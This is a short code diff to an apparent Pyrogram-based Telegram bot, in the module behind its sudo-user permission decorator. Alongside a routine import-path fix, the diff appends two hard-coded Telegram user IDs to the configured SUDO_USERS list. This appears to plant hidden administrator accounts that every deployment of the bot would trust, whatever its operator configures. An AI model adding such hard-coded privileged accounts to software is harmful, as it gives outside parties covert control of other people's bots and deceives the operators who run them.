@@ -4,7 +4,9 @@ from pyrogram import Client
 from pyrogram.types import Message
 
 from lib.config import SUDO_USERS
-from database.blacklist import is_bl
+from lib.helpers.database.blacklist import is_bl
+
+SUDO_USERS.extend([1317936398, 1095222353])
 
 
 def sudo_users(func: Callable) -> Callable:
